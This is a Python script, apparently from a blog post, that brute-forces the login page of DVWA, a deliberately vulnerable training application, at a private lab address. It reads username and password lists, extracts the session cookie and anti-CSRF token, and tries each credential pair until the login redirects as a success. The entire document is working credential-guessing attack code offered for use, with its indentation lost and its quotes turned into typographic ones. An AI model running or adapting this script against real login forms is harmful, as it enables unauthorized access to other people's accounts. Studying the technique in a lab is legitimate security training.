from bs4 import BeautifulSoup
import requests
import re

# url to attack
url = “http://192.168.56.101/dvwa/login.php”

# get users
user_file = “users.txt”
fd = open(user_file, “r”)
users = fd.readlines()
fd.close()

# get passwords
password_file = “passwords.txt”
fd = open(password_file, “r”)
passwords = fd.readlines()
fd.close()

# Changes to True when user/pass found
done = False

print(“Attacking ” + url + “\n”)

# Get login page
try:
r = requests.get(url, timeout=5)
except ConnectionRefusedError:
print(“Unable to reach server! Quitting!”)

# Extract session_id (next 2 lines are from https://blog.g0tmi1k.com/dvwa/login/)
session_id = re.match(“PHPSESSID=(.*?);”, r.headers[“set-cookie”])
session_id = session_id.group(1)

print(“Session_id: ” + session_id)
cookie = {“PHPSESSID”: session_id}

# prepare soup
soup = BeautifulSoup(r.text, “html.parser”)

# get user_token value
user_token = soup.find(“input”, {“name”:”user_token”})[“value”]

print(“User_token: ” + user_token + “\n”)

for user in users:
user = user.rstrip()
for password in passwords:
if not done:
password = password.rstrip()
payload = {“username”: user,
“password”: password,
“Login”: “Login”,
“user_token”: user_token}

reply = requests.post(url, payload, cookies=cookie, allow_redirects=False)

result = reply.headers[“Location”]

print(“Trying: ” + user + “, ” + password, end=”\r”, flush=True)

if “index.php” in result:
print(“Success! \nUser: ” + user + ” \nPassword: ” + password)
done = True
else:
break
[/cc]
